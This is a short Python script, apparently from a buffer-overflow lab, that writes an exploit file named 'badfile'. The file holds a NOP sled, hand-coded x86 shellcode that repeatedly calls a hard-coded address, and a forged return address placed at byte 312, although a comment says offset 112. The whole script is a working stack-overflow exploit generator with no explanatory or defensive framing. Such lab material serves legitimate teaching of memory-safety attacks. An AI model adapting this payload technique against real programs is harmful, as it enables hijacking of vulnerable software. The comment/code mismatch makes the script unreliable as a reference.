import sys 
 
shellcode= ( 
"\x6A\x09" 
"\x6A\x01"
"\xBB\x86\x62\x55\x56"
"\xFF\xD3"
"\x31\xC9"
"\x51"
"\x50"
"\xFF\xD3"
"\x6A\x05"
"\x50"
"\xFF\xD3"
"\x31\xC9"
"\x51"
"\x50"
"\xFF\xD3"
"\x31\xC9"
"\x51"
"\x50"
"\xFF\xD3"
"\x6A\x08"
"\x50"
"\xFF\xD3"  
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(600)) 
# Put the shellcode at the end 
start = 600 - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffcf88 + 150 
content[312:316] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 
